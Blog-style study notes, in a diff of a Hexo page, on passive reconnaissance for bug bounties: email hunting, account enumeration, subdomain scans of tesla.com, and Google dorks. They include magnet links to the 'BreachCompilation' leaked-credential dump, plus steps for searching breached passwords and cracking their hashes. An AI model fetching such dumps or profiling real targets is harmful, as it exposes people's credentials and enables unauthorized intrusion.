@@ -126,6 +126,882 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="passive-Passive_Reconnaissance" class="article article-type-passive" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/12/21/Passive_Reconnaissance/" class="article-date">
+  	<time datetime="2024-12-21T12:32:07.089Z" itemprop="datePublished">2024-12-21</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/12/21/Passive_Reconnaissance/">
+        Passive Reconnaissance
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Passive-Reconnaissance"><a href="#Passive-Reconnaissance" class="headerlink" title="Passive Reconnaissance"></a>Passive Reconnaissance</h1><hr>
+<p>Physical&#x2F;Social</p>
+<ul>
+<li>Location Information<ul>
+<li>Satellite images</li>
+<li>Drone recon</li>
+<li>Building layout<ul>
+<li>badge readers</li>
+<li>break areas</li>
+<li>security</li>
+<li>fencing</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Job Information<ul>
+<li>Employees<ul>
+<li>name</li>
+<li>job title</li>
+<li>phone number</li>
+<li>manager</li>
+</ul>
+</li>
+<li>Pictures<ul>
+<li>badge photos</li>
+<li>desk photos</li>
+<li>computer</li>
+<li>photos</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>有可能遇到攻擊到錯誤的目標，所以再攻擊前要驗證目標</p>
+<p>對網路進行外部評估時，數據洩漏是最常見的方式，憑據被破壞，利用憑據獲取訪問權限，或利用用戶名獲取訪問權限</p>
+<p>尋找子域，透過工具，查看主機運行服務，打開的端口</p>
+<p> 確認目標 &gt; 訊息蒐集  &gt; 枚舉 &gt; 掃描</p>
+<ul>
+<li>Target Validation 目標驗證<ul>
+<li>WHOIS</li>
+<li>nslookup</li>
+<li>dnsrecon</li>
+</ul>
+</li>
+<li>Finding Subdomains 尋找子域<ul>
+<li>Google Fu</li>
+<li>dig</li>
+<li>Nmap</li>
+<li>Sublist3r</li>
+<li>Bluto</li>
+<li><a target="_blank" rel="noopener" href="http://crt.sh/">crt.sh</a></li>
+</ul>
+</li>
+<li>Fingerprinting 指紋識別<ul>
+<li>Nmap</li>
+<li>Wappalyzer</li>
+<li>WhatWeb</li>
+<li>BuiltWith</li>
+<li>Netcat</li>
+</ul>
+</li>
+<li>Data Breaches 資料外洩<ul>
+<li>HavelBeenPwned</li>
+<li>Breach-Parse</li>
+<li>WeLeakInfo</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="Identifying-Our-Target"><a href="#Identifying-Our-Target" class="headerlink" title="Identifying Our Target"></a><strong>Identifying Our Target</strong></h3><ul>
+<li>公開漏洞賞金計畫平台 : <a target="_blank" rel="noopener" href="https://bugcrowd.com/programs">https://bugcrowd.com/programs</a></li>
+<li>根據錯誤提交給該組織可以獲取一定的收入</li>
+<li>找到目標 example: Tesla</li>
+</ul>
+<p><img src="/img/passive_Untitled.png" alt="Untitled"></p>
+<ul>
+<li>攻擊前，要確認該目標還有bug bounty</li>
+<li>其中有些不一定會給獎金，可能是積分或是名譽</li>
+<li>閱讀目標訊息、規則</li>
+</ul>
+<p><img src="/img/passive_Untitled_1.png" alt="Untitled"></p>
+<ul>
+<li>在範圍內進行測試不要超出範圍</li>
+</ul>
+<p><img src="/img/passive_Untitled_2.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_3.png" alt="Untitled"></p>
+<h3 id="Discovering-Email-Addresses"><a href="#Discovering-Email-Addresses" class="headerlink" title="Discovering Email Addresses"></a><strong>Discovering Email Addresses</strong></h3><ul>
+<li><p>查找電子郵件地址並嘗試尋找目標人員</p>
+</li>
+<li><p>我要尋找銷售、我要向誰發送郵件</p>
+</li>
+<li><p>不一定Google search都找的到</p>
+</li>
+<li><p>可能目標是公開訊息，也可能需要更深入挖掘</p>
+</li>
+<li><p>電子郵件</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://hunter.io/search">hunter.io</a></li>
+<li>每個月50~100次免費搜索</li>
+</ul>
+<p>  <img src="/img/passive_Untitled_4.png" alt="Untitled"></p>
+<ul>
+<li><p>可以在這裡搜尋目標郵件</p>
+<ul>
+<li>特定人員、部門、公司郵件…</li>
+</ul>
+<p>  <img src="/img/passive_Untitled_5.png" alt="Untitled"></p>
+<p>  <img src="/img/passive_Untitled_6.png" alt="Untitled"></p>
+<p>  <img src="/img/passive_Untitled_7.png" alt="Untitled"></p>
+</li>
+</ul>
+</li>
+<li><p>電話簿</p>
+<ul>
+<li>phonebook.cz</li>
+</ul>
+</li>
+</ul>
+<p><img src="/img/passive_Untitled_8.png" alt="Untitled"></p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.voilanorbert.com/">vilanorbert.com</a></p>
+<ul>
+<li><p>免費50條線索</p>
+<p>  <img src="/img/passive_Untitled_9.png" alt="Untitled"></p>
+</li>
+<li><p>找到目標人員</p>
+</li>
+</ul>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://chromewebstore.google.com/detail/clearbit-connect-free-ver/pmnhcgfcafcnkbengdcanjablaabjplo">clearbit connect</a></p>
+<ul>
+<li>向您發送電子郵件的人的信息以及他們的公司資訊</li>
+<li>將能夠按角色、資歷和頭銜進行過濾</li>
+<li>點擊任何人以獲取更多信息，並可選擇檢索他們的電子郵件地址</li>
+<li>設定並儲存您的理想客戶檔案 (ICP)</li>
+<li>可以將網域新增至「封鎖清單」</li>
+<li>找到特定組織人員，並連繫LinkedIn</li>
+</ul>
+<p>  <img src="/img/passive_Untitled_10.png" alt="Untitled"></p>
+<p>  <img src="/img/passive_Untitled_11.png" alt="Untitled"></p>
+<p>  <img src="/img/passive_Untitled_12.png" alt="Untitled">
+  </p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://tools.emailhippo.com/">https://tools.emailhippo.com/</a></p>
+<ul>
+<li>找到某人，並發現有淺在電子郵件地址，到這網站驗證該郵件地址是否真實存在</li>
+</ul>
+<p>  <img src="/img/passive_Untitled_13.png" alt="Untitled"></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://email-checker.net/">email-checker.net</a></p>
+<ul>
+<li>檢查郵件是否存在</li>
+</ul>
+<p>  <img src="/img/passive_Untitled_14.png" alt="Untitled"></p>
+<p>  <img src="/img/passive_Untitled_15.png" alt="Untitled">
+  </p>
+</li>
+<li><p>Google 帳戶</p>
+<ul>
+<li>搜尋帳戶是否存在 &gt; 成功進到密碼輸入 &gt;確認帳戶存在</li>
+<li>點擊忘記密碼 &gt; 嘗試其他方式 &gt; 猜測傳送驗證碼的目標位置 &gt; 確認對方身分</li>
+</ul>
+<p>  <img src="/img/passive_Untitled_16.png" alt="Untitled"></p>
+<p>  <img src="/img/passive_Untitled_17.png" alt="Untitled"></p>
+<p>  <img src="/img/passive_Untitled_18.png" alt="Untitled"></p>
+<p>  <img src="/img/passive_Untitled_19.png" alt="Untitled"></p>
+</li>
+</ul>
+<h3 id="Gathering-Breached-Credentials-with-Breach-Parse"><a href="#Gathering-Breached-Credentials-with-Breach-Parse" class="headerlink" title="Gathering Breached Credentials with Breach-Parse"></a><strong>Gathering Breached Credentials with Breach-Parse</strong></h3><ul>
+<li><p>Github &gt; search hmaverickadams &gt; click <a target="_blank" rel="noopener" href="https://github.com/hmaverickadams/breach-parse">breach-parse</a></p>
+</li>
+<li><p>apt download Deluge and Open it then type magnet…to download that file</p>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">（1）二进制未压缩41G磁力下载链接地址</span><br><span class="line"></span><br><span class="line">magnet:?xt=urn:btih:7ffbcd8cee06aba2ce6561688cf68ce2addca0a3&amp;dn=BreachCompilation&amp;<span class="built_in">tr</span>=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&amp;<span class="built_in">tr</span>=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&amp;<span class="built_in">tr</span>=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&amp;<span class="built_in">tr</span>=udp%3A%2F%2Fglotorrents.pw%3A6969&amp;<span class="built_in">tr</span>=udp%3A%2F%2Ftracker.opentrackr.org%3A1337</span><br><span class="line"></span><br><span class="line">（2）二进制压缩11G磁力下载链接地址</span><br><span class="line"></span><br><span class="line">magnet:?xt=urn:btih:09250e1953e5a7fefeaa6206e81d02e53b5b374a&amp;dn=BreachCompilation.tar.bz2&amp;<span class="built_in">tr</span>=udp://tracker.leechers-paradise.org:6969/announce&amp;<span class="built_in">tr</span>=udp://tracker.opentrackr.org:1337/announce&amp;<span class="built_in">tr</span>=udp://tracker.pirateparty.gr:6969&amp;<span class="built_in">tr</span>=udp://tracker.coppersurfer.tk:6969/announce&amp;<span class="built_in">tr</span>=udp://tracker.zer0day.to:1337/announce</span><br><span class="line"></span><br><span class="line">此集合資料庫中包含從Bitcoin、Pastebin、LinkedIn、MySpace、Netflix、YouPorn、Last.FM、Zoosk、Badoo、RedBox以及遊戲平台（Minecraft和Runescape等）洩漏的數據，以及Anti Public，Exploit.<span class="keyword">in</span>洩漏的憑證列表。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>下載好後運行</p>
+</li>
+</ul>
+<p><img src="/img/passive_Untitled_20.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_21.png" alt="Untitled"></p>
+<h3 id="Hunting-Breached-Credentials-with-DeHashed"><a href="#Hunting-Breached-Credentials-with-DeHashed" class="headerlink" title="Hunting Breached Credentials with DeHashed"></a><strong>Hunting Breached Credentials with DeHashed</strong></h3><ul>
+<li><a target="_blank" rel="noopener" href="https://www.dehashed.com/">DEHASHED</a><ul>
+<li><p>通過電子郵件、用戶名、IP地址、姓名、電話號碼..進行搜索</p>
+<p>  <img src="/img/passive_Untitled_22.png" alt="Untitled"></p>
+<p>  <img src="/img/passive_Untitled_23.png" alt="Untitled"></p>
+</li>
+<li><p>有些帳號的密碼是Hash &gt; 搜索該Hash還有很多不同帳號一樣</p>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="/img/passive_Untitled_24.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_25.png" alt="Untitled"></p>
+<ul>
+<li>搜索<a target="_blank" rel="noopener" href="https://hashes.com/en/decrypt/hash">hashes.org</a> &gt; 查找目標Hash &gt; 如果有搜索到就會顯示破解結果</li>
+<li>或是通過Google直接搜索該Hash是否有相關資料</li>
+</ul>
+<p><img src="/img/passive_Untitled_26.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_27.png" alt="Untitled"></p>
+<h3 id="Hunting-Subdomains-Part-1"><a href="#Hunting-Subdomains-Part-1" class="headerlink" title="Hunting Subdomains Part 1"></a><strong>Hunting Subdomains Part 1</strong></h3><p> 外部或內部進行滲透測試時遇到一個網站，能夠蒐集該網站訊息，或是在網站上進行一些操作</p>
+<p>在攻擊前，需要確認有哪些子域、攻擊範圍</p>
+<ul>
+<li><p>example : *.tesla.com</p>
+</li>
+<li><p>獲取子域</p>
+<ul>
+<li>sublist3r</li>
+</ul>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# apt install sublist3r</span><br></pre></td></tr></table></figure>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# sublist3r -d tesla.com</span><br><span class="line"></span><br><span class="line">                 ____        _     _ _     _   _____                                                                                                         </span><br><span class="line">                / ___| _   _| |__ | (_)___| |_|___ / _ __                                                                                                    </span><br><span class="line">                \___ \| | | | <span class="string">&#x27;_ \| | / __| __| |_ \| &#x27;</span>__|                                                                                                   </span><br><span class="line">                 ___) | |_| | |_) | | \__ \ |_ ___) | |                                                                                                      </span><br><span class="line">                |____/ \__,_|_.__/|_|_|___/\__|____/|_|                                                                                                      </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">                <span class="comment"># Coded By Ahmed Aboul-Ela - @aboul3la                                                                                                       </span></span><br><span class="line">                                                                                                                                                             </span><br><span class="line">[-] Enumerating subdomains now <span class="keyword">for</span> tesla.com                                                                                                                 </span><br><span class="line">[-] Searching now <span class="keyword">in</span> Baidu..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Yahoo..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Google..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Bing..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Ask..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Netcraft..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> DNSdumpster..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Virustotal..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> ThreatCrowd..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> SSL Certificates..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> PassiveDNS..</span><br><span class="line">[!] Error: Virustotal probably now is blocking our requests</span><br><span class="line">[-] Total Unique Subdomains Found: 296</span><br><span class="line">www.tesla.com</span><br><span class="line">CitiBankStatementSHA512.tesla.com</span><br><span class="line">OpenADRClient.tesla.com</span><br><span class="line">akamai-apigateway-vehicleextinfogw-prdsvc-st.tesla.com</span><br><span class="line">akamai-apigateway-vehicleextinfogw-stgsvc-st.tesla.com</span><br><span class="line">ams13-gpgw1.tesla.com</span><br><span class="line">apac-cppm.tesla.com</span><br><span class="line">apacvpn.tesla.com</span><br><span class="line">apacvpn1.tesla.com</span><br><span class="line">apacvpn2.tesla.com</span><br><span class="line">api-account-master.tesla.com</span><br><span class="line">api-toolbox.tesla.com</span><br><span class="line">sentry.app.tesla.com</span><br><span class="line">appplayer.tesla.com</span><br><span class="line">sso-dev.tesla.com</span><br><span class="line">sso-sandbox.tesla.com</span><br><span class="line">sso-sig.tesla.com</span><br><span class="line">autodiscover.tesla.com</span><br><span class="line">awsbtest.tesla.com</span><br><span class="line">bctpay.tesla.com</span><br><span class="line">billing.tesla.com</span><br><span class="line">bom01-gpgw1.tesla.com</span><br><span class="line">ca.tesla.com</span><br><span class="line">ciscoguest.tesla.com</span><br><span class="line">........</span><br><span class="line">www-stg2.tesla.com</span><br><span class="line">www-test.tesla.com</span><br><span class="line">www-uat.tesla.com</span><br><span class="line">www-uat2.tesla.com</span><br><span class="line">www45.tesla.com</span><br><span class="line">xmail.tesla.com</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>根據域名查看到一些敏感網頁</p>
+</li>
+<li><p>尋找已註冊證書</p>
+<ul>
+<li>Google Search <a target="_blank" rel="noopener" href="https://crt.sh/">Crt.sh</a></li>
+</ul>
+<p>  <img src="/img/passive_Untitled_28.png" alt="Untitled"></p>
+<p>  <img src="/img/passive_Untitled_29.png" alt="Untitled"></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/owasp-amass/amass">https://github.com/owasp-amass/amass</a> 速度較慢，但工具功能完整</p>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# docker run -v OUTPUT_DIR_PATH:/.config/amass/ caffix/amass enum -d tesla.com    </span><br><span class="line"></span><br><span class="line">tesla.com (FQDN) --&gt; ns_record --&gt; a7-66.akam.net (FQDN)</span><br><span class="line">tesla.com (FQDN) --&gt; ns_record --&gt; a28-65.akam.net (FQDN)</span><br><span class="line">tesla.com (FQDN) --&gt; ns_record --&gt; edns69.ultradns.com (FQDN)</span><br><span class="line">tesla.com (FQDN) --&gt; ns_record --&gt; a12-64.akam.net (FQDN)</span><br><span class="line">tesla.com (FQDN) --&gt; ns_record --&gt; a10-67.akam.net (FQDN)</span><br><span class="line">tesla.com (FQDN) --&gt; ns_record --&gt; a9-67.akam.net (FQDN)</span><br><span class="line">tesla.com (FQDN) --&gt; ns_record --&gt; a1-12.akam.net (FQDN)</span><br><span class="line">tesla.com (FQDN) --&gt; mx_record --&gt; tesla-com.mail.protection.outlook.com (FQDN)</span><br><span class="line">akamai-apigateway-ehs.tesla.com (FQDN) --&gt; cname_record --&gt; akamai-apigateway-ehs.tesla.com.edgekey.net (FQDN)</span><br><span class="line">akamai-apigateway-bender.tesla.com (FQDN) --&gt; cname_record --&gt; akamai-apigateway-bender.tesla.com.edgekey.net (FQDN)</span><br><span class="line">akamai-apigateway-dev-warptmsapiserver.tesla.com (FQDN) --&gt; cname_record --&gt; akamai-apigateway-dev-warptmsapiserver.tesla.com.edgekey.net (FQDN)</span><br><span class="line">akamai-apigateway-deliveryopsvitu.tesla.com (FQDN) --&gt; cname_record --&gt; akamai-apigateway-deliveryopsvitu.tesla.com.edgekey.net (FQDN)</span><br><span class="line">akamai-apigateway-ehs-stg.tesla.com (FQDN) --&gt; cname_record --&gt; akamai-apigateway-ehs-stg.tesla.com.edgekey.net (FQDN)</span><br><span class="line">akamai-apigateway-einvoicing.tesla.com (FQDN) --&gt; cname_record --&gt; akamai-apigateway-einvoicing.tesla.com.edgekey.net (FQDN)</span><br><span class="line">akamai-apigateway-dev-warptmsapiserver-upgrade.tesla.com (FQDN) --&gt; cname_record --&gt; akamai-apigateway-dev-warptmsapiserver-upgrade.tesla.com.edgekey.net (FQDN)</span><br><span class="line">akamai-apigateway-automation.tesla.com (FQDN) --&gt; cname_record --&gt; akamai-apigateway-automation.tesla.com.edgekey.net (FQDN)</span><br><span class="line">....</span><br><span class="line">xmail.tesla.com (FQDN) --&gt; a_record --&gt; 204.74.99.100 (IPAddress)</span><br><span class="line">share.tesla.com (FQDN) --&gt; cname_record --&gt; group301.tesla.com.akadns.net (FQDN)</span><br><span class="line">mta.email.tesla.com (FQDN) --&gt; a_record --&gt; 13.111.14.190 (IPAddress)</span><br><span class="line">sso-dev.tesla.com (FQDN) --&gt; cname_record --&gt; sso-dev.edgekey.net (FQDN)</span><br><span class="line">click.email.tesla.com (FQDN) --&gt; cname_record --&gt; click.virt.s7.exacttarget.com (FQDN)</span><br><span class="line">mobile.kronos.tesla.com (FQDN) --&gt; cname_record --&gt; frontend-app-1817070613.us-west-2.elb.amazonaws.com (FQDN)</span><br><span class="line">13.111.0.0/16 (Netblock) --&gt; contains --&gt; 13.111.47.195 (IPAddress)</span><br><span class="line">2610:a1:1014::/48 (Netblock) --&gt; contains --&gt; 2610:a1:1014::245 (IPAddress)</span><br><span class="line">8.45.124.0/24 (Netblock) --&gt; contains --&gt; 8.45.124.215 (IPAddress)</span><br><span class="line">168.245.0.0/17 (Netblock) --&gt; contains --&gt; 168.245.123.10 (IPAddress)</span><br><span class="line">...</span><br><span class="line">2600:9000:2066::/48 (Netblock) --&gt; contains --&gt; 2600:9000:2066:7800:8:f087:d100:93a1 (IPAddress)</span><br><span class="line">2600:9000:2066::/48 (Netblock) --&gt; contains --&gt; 2600:9000:2066:1e00:8:f087:d100:93a1 (IPAddress)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/tomnomnom/httprobe">tomnomnom httprobe</a> 探測提供列表</p>
+<ul>
+<li>確認該網頁是真是假</li>
+<li>可以把sublist3r掃出網域丟給它驗證</li>
+</ul>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">輸出domain.txt中的目標網域訊息並給httprobe執行</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> domain.txt | httprobe</span><br><span class="line"></span><br><span class="line">預設情況下，httprobe 檢查連接埠 80 上的 HTTP 和連接埠 443 上的 HTTPS。</span><br><span class="line">透過指定協定和連接埠對，使用 -p 標誌新增其他偵測器：</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> domain.txt | httprobe -p http:81 -p https:8443</span><br><span class="line"></span><br><span class="line">設置進程數 -c</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> domains.txt | httprobe -c 50</span><br><span class="line"></span><br><span class="line">使用 -t 標誌並指定逾時（以毫秒為單位）來變更逾時：</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> domains.txt | httprobe -t 20000</span><br><span class="line"></span><br><span class="line">不想在連接埠 80 上探測 HTTP 或在連接埠 443 上探測 HTTPS，則可以使用 -s 標誌</span><br><span class="line">使用 -p 標誌指定您想要的探測器</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> domains.txt | httprobe -s -p https:8443</span><br><span class="line"></span><br><span class="line">不關心檢查 HTTPS 是否正常運作。您可以使用 --prefer-https 標誌來做到這一點：</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> domains.txt | httprobe --prefer-https</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="Identifying-Website-Technologies"><a href="#Identifying-Website-Technologies" class="headerlink" title="Identifying Website Technologies"></a><strong>Identifying Website Technologies</strong></h3><p>查看網站使用服務、網頁框架、操作系統、程式語言…</p>
+<ul>
+<li>透過版本查找漏洞</li>
+<li><a target="_blank" rel="noopener" href="https://builtwith.com/">https://builtwith.com/</a></li>
+</ul>
+<p><img src="/img/passive_Untitled_30.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_31.png" alt="Untitled"></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://chromewebstore.google.com/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg?hl=zh-TW">wappalyer</a></li>
+</ul>
+<p><img src="/img/passive_Untitled_32.png" alt="Untitled"></p>
+<ul>
+<li>whatweb 查看更多網站資訊</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt/httprobe/script]</span><br><span class="line">└─# whatweb https://www.cht.com.tw/</span><br><span class="line">https://www.cht.com.tw/ [302 Found] Access-Control-Allow-Methods[GET,POST], Cookies[UqZBpD3n3iPIDwJU9DmYiW2UWf8W+5RO], Country[TAIWAN; REPUBLIC OF CHINA (ROC)][TW], HTTPServer[HiNetCDN/2310], IP[203.66.32.44], RedirectLocation[https://www.cht.com.tw/home/consumer], Strict-Transport-Security[max-age=31536000], Title[文件已移動], UncommonHeaders[access-control-allow-methods,access-control-allow-headers,x-request-id], X-Frame-Options[SAMEORIGIN]</span><br><span class="line">https://www.cht.com.tw/home/consumer [200 OK] ASP_NET, Access-Control-Allow-Methods[GET,POST], Cookies[AAREFRZ,ASP.NET_SessionId,BPSCBFG,CEWQETV,HWERQTS,NOFSDGV,SC_ANALYTICS_GLOBAL_COOKIE,UqZBpD3n3iPIDwJU9DmYiW2UWf8W+5RO,expires], Country[TAIWAN; REPUBLIC OF CHINA (ROC)][TW], Frame, HTML5, HTTPServer[HiNetCDN/2310], HttpOnly[AAREFRZ,ASP.NET_SessionId,BPSCBFG,CEWQETV,HWERQTS,NOFSDGV,SC_ANALYTICS_GLOBAL_COOKIE,expires], IP[203.66.32.102], Open-Graph-Protocol[website], Script[text/javascript], SiteCore, Strict-Transport-Security[max-age=31536000], Title[中華電信 - 5G行動上網通話、HiNet光世代寬頻上網/市話、MOD影視娛樂及智慧生活應用 | 中華電信網路門市CHT.com.tw], UncommonHeaders[access-control-allow-origin,content-security-policy,access-control-allow-methods,access-control-allow-headers,x-request-id], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=Edge]</span><br></pre></td></tr></table></figure>
+
+<h3 id="Information-Gathering-with-Burp-Suite"><a href="#Information-Gathering-with-Burp-Suite" class="headerlink" title="Information Gathering with Burp Suite"></a><strong>Information Gathering with Burp Suite</strong></h3><ul>
+<li><p>Burp Suite</p>
+<ul>
+<li><p>先去設定FireFox &gt; 側欄找到setting &gt; General &gt; 滑到最底下的Network Proxy&gt;Settings</p>
+<p>  <img src="/img/passive_Untitled_33.png" alt="Untitled"></p>
+<p>  <img src="/img/passive_Untitled_34.png" alt="Untitled"></p>
+</li>
+<li><p>再瀏覽器搜尋<a target="_blank" rel="noopener" href="https://burp/">https://burp/</a> &gt; 點擊CA Certificate</p>
+</li>
+</ul>
+<p>  <img src="/img/passive_Untitled_35.png" alt="Untitled"></p>
+<ul>
+<li><p>回到FireFox Setting &gt; Privacy &amp; Security &gt; Security &gt; View Certificate &gt; Import cacert.der &gt; 兩選項都打勾</p>
+</li>
+<li><p>開啟Burp Suite <code>Intercept is on</code> &gt;搜索目標網站&gt;Burp Suite會顯示該網站資訊</p>
+<p>  <img src="/img/passive_Untitled_36.png" alt="Untitled"></p>
+</li>
+<li><p>可以按Forward繼續看到網頁內容，並擷取到其他頁面資訊</p>
+</li>
+<li><p>點擊Target</p>
+<ul>
+<li>當前已載入過的頁面</li>
+<li>攔截的流量</li>
+<li>當下點擊目標頁面中的其他連結也會即時刷新此處資訊</li>
+</ul>
+<p>  <img src="/img/passive_Untitled_37.png" alt="Untitled"></p>
+<ul>
+<li>Response 會看到更多詳盡資訊</li>
+</ul>
+<p>  <img src="/img/passive_Untitled_38.png" alt="Untitled">
+  </p>
+</li>
+<li><p>Burp suite Pro 才有主動掃描功能</p>
+</li>
+</ul>
+<p>  <img src="/img/passive_Untitled_39.png" alt="Untitled"></p>
+</li>
+</ul>
+<h3 id="Google-Fu"><a href="#Google-Fu" class="headerlink" title="Google Fu"></a><strong>Google Fu</strong></h3><ul>
+<li>語法搜索<ul>
+<li><p><a target="_blank" rel="noopener" href="https://ahrefs.com/blog/google-advanced-search-operators/">https://ahrefs.com/blog/google-advanced-search-operators/</a></p>
+</li>
+<li><p>控制搜索網域</p>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">site:tesla.com **-www -ir**</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索所有有關tesla.com的內容，但網域名稱不含www,ir</span></span><br><span class="line"><span class="comment"># &#x27;-&#x27;是不要網域中出現特定字串</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查詢該網域下有的指定類型內容</p>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">site:tesla.com filetype:docx</span><br></pre></td></tr></table></figure>
+<p>  <img src="/img/passive_Untitled_40.png" alt="Untitled"></p>
+</li>
+<li><p>搜尋快取頁面</p>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cache:tesla.com</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<p>基礎運算子</p>
+<table>
+<thead>
+<tr>
+<th>符號</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>+</td>
+<td>• 在關鍵字前：搜尋所有包含關鍵字的資料</td>
+</tr>
+<tr>
+<td>EX：”教育部”+體育</td>
+<td></td>
+</tr>
+<tr>
+<td>• 在關鍵字後：作為血型查詢</td>
+<td></td>
+</tr>
+<tr>
+<td>EX：AB+</td>
+<td></td>
+</tr>
+<tr>
+<td>• 其他位置：直接被忽略</td>
+<td></td>
+</tr>
+<tr>
+<td>$</td>
+<td>• 搜尋內容有符合價格的網頁</td>
+</tr>
+<tr>
+<td>EX：iPhone $15000</td>
+<td></td>
+</tr>
+<tr>
+<td>-</td>
+<td>• 在關鍵字前：搜尋結果中”排除”含有關鍵字的資料</td>
+</tr>
+<tr>
+<td>EX：要找搜尋引擎，但要排除google、yahoo和bing</td>
+<td></td>
+</tr>
+<tr>
+<td>條件式：搜尋引擎 -google -yahoo -bing</td>
+<td></td>
+</tr>
+<tr>
+<td>~</td>
+<td>• 搜尋關鍵字的相關同義字</td>
+</tr>
+<tr>
+<td>EX：要找摩托車的所有相關同義字(機車)</td>
+<td></td>
+</tr>
+<tr>
+<td>條件式：~摩托車</td>
+<td></td>
+</tr>
+<tr>
+<td>“ “</td>
+<td>強制限定關鍵字文字內容的順序(必須與關鍵字相吻合)</td>
+</tr>
+<tr>
+<td>.</td>
+<td>• 表示任何㇐個字元(包括空格及無物)</td>
+</tr>
+<tr>
+<td>• 僅適用於英數字的關鍵字條件搜尋</td>
+<td></td>
+</tr>
+<tr>
+<td>EX：Tain.n city</td>
+<td></td>
+</tr>
+<tr>
+<td>• 用在排除的關鍵字：會被當成句點而非任意字元</td>
+<td></td>
+</tr>
+<tr>
+<td>EX：搜尋引擎 -goo.le -yahoo -bing</td>
+<td></td>
+</tr>
+<tr>
+<td>*</td>
+<td>• 表示任何㇐個字元(含)以上</td>
+</tr>
+<tr>
+<td>• 位置㇐定要在兩個文字之間</td>
+<td></td>
+</tr>
+<tr>
+<td>EX：”大學*考”</td>
+<td></td>
+</tr>
+<tr>
+<td>• 用在排除的關鍵字：會被當成星號而非任意字串</td>
+<td></td>
+</tr>
+<tr>
+<td>EX：搜尋引擎 -g*e -yahoo -bing</td>
+<td></td>
+</tr>
+<tr>
+<td>..</td>
+<td></td>
+</tr>
+<tr>
+<td>…</td>
+<td>• 放在兩數字之間：表示在此範圍內的數字或金錢</td>
+</tr>
+<tr>
+<td>EX：檯燈 $1000..$2000</td>
+<td></td>
+</tr>
+<tr>
+<td>OR</td>
+<td></td>
+</tr>
+<tr>
+<td>• 功用：搜尋關鍵字組合群的其中之㇐關鍵字(聯集)</td>
+<td></td>
+</tr>
+<tr>
+<td>• 使用時㇐般會搭配圓括弧做限定</td>
+<td></td>
+</tr>
+<tr>
+<td>EX：台灣(“大學”</td>
+<td>”科技”)</td>
+</tr>
+</tbody></table>
+<p>進階運算子</p>
+<table>
+<thead>
+<tr>
+<th>運算子</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>intitle 和 allintitle</td>
+<td>搜尋網頁的標題內容</td>
+</tr>
+<tr>
+<td>intext 和 allintext</td>
+<td>搜尋網頁的本文、論壇的內文或新聞內容</td>
+</tr>
+<tr>
+<td>inurl 和 allinurl</td>
+<td>搜尋網頁的URL內容</td>
+</tr>
+<tr>
+<td>inanchor 和</td>
+<td></td>
+</tr>
+<tr>
+<td>allinanchor</td>
